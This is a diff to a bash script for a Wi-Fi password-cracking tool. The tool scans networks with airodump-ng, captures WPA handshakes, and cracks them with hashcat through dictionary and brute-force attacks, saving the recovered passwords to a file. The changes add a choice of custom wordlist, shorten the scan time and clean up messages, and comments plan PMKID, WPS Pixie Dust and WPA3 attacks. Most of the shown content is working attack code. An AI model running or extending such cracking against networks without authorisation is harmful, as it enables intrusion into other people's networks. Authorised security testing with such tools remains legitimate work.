@@ -1,24 +1,24 @@
 #!/bin/bash
 
-# version: 3.5.1 8/2/25 05:30
+# version: 3.5.2 20/5/25 09:30
 
 
 ### Changlog ###
-# 3.5.1 - Added WEP cracking.
+	# Bug fixes.
 
 ### FIX ###
-# delay between scan to output
+	# delay between scan to output
 
 ### To Do ###
-# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
-# run all networks or range of them at the same time.
-# add more dictioneries than rockyou?
-# specific passwords lists for different vendors
-# functions to crack PMKID (using hcxpcapngtool..)
-# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
-# find attacks for WPA3
-# Add clients untill we choose network.
-# Show WPS routers - and add Pixydust attack.
+	# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
+	# run all networks or range of them at the same time.
+	# add more dictioneries than rockyou?
+	# specific passwords lists for different vendors
+	# functions to crack PMKID (using hcxpcapngtool..)
+	# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
+	# find attacks for WPA3
+	# Add clients untill we choose network.
+	# Show WPS routers - and add Pixydust attack.
 
 
 
@@ -180,7 +180,7 @@ function spoof_adapter_mac() {
 # ------------------------------
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=5
         sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
@@ -347,8 +347,8 @@ function choose_network() {
         fi
 
         # Check if we already have the Wi-Fi password for this BSSID
-        if sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The wifi password is:"; then
-            wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
+        if sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
+            wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
             echo -e "\033[1;32mPassword already exists for this network!\033[0m"
             echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
             echo -e "Choose different Network.\n"
@@ -618,37 +618,64 @@ function crack_wep() {
 # -------------------------
 # Dictionary Attack
 # -------------------------
+
 function dictionary_attack() {
-	
-    echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
-    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -m 22000 -a 0 "$targets_path/$bssid_name/hash.hc22000" $rockyou_file --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable; sleep 5"
+    # Ask user if they want to use the default Rockyou wordlist
+    echo -e "\n\033[1mUse Rockyou wordlist (Y) or Choose different wordlist (n) ?\033[0m"
+    read -r use_rockyou
+
+    if [[ "$use_rockyou" =~ ^[Nn]$ ]]; then
+        # Ask for custom dictionary file path
+        read -e -p "Enter the full path to your custom dictionary file: " custom_dict
+        if [ ! -f "$custom_dict" ]; then
+            echo -e "\e[1;31mError:\e[0m File does not exist. Exiting..."
+            exit 1
+        fi
+        dict_file="$custom_dict"
+    else
+        # Use default Rockyou path
+        dict_file="$rockyou_file"
+    fi
+
+    echo -e "\e[1m\nCracking Wi-Fi password using: $dict_file ->>\n\e[0m"
+    
+    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
+    "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
+    --outfile \"$targets_path/$bssid_name/$bssid_name-wifi_password.txt\" \
+    --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable; sleep 5"
 
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+        echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
+        
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
-        rm -r $targets_path/"$bssid_name" 
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        
+        rm -r "$targets_path/$bssid_name"
         exit 1
     else
-        echo -e "\n\033[1;31m\033[1mCouldn't crack with the Rockyou wordlist..\033[0m\n"
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Rockyou wordlist" "$targets_path/wifi_passwords.txt"
+        echo -e "\n\033[1;31m\033[1mCouldn't crack the password with the selected wordlist.\033[0m\n"
+        
+        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
+        
         echo
-	read -p "Do you want to run a Brute-Force attack (Y/n)? " choice
-	case $choice in
-	    y|Y)
-		brute-force_attack
-		;;
-	    n|N)
-		another_scan_prompt
-		;;
-	    *)
-		echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
-		;;
-	esac        
+        read -p "Do you want to run a Brute-Force attack? (Y/n): " choice
+        case $choice in
+            y|Y)
+                brute-force_attack
+                ;;
+            n|N)
+                another_scan_prompt
+                ;;
+            *)
+                echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
+                ;;
+        esac        
     fi
 }
+
 
 
 # ------------------------------
@@ -794,7 +821,7 @@ function brute-force_attack() {
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
         echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
         exit 1
     else
@@ -920,7 +947,7 @@ function cleanup() {
 function choose_password_attack() {
 	while true; do
 	    echo -e "\n\033[1;33mChoose how to crack the password:\e[0m"
-	    echo "1) Dictionary attack (Rockyou wordlist)"
+	    echo "1) Dictionary attack"
 	    echo "2) Brute-Force attack"
 	    read -p "Enter your choice: " choice
 	    echo
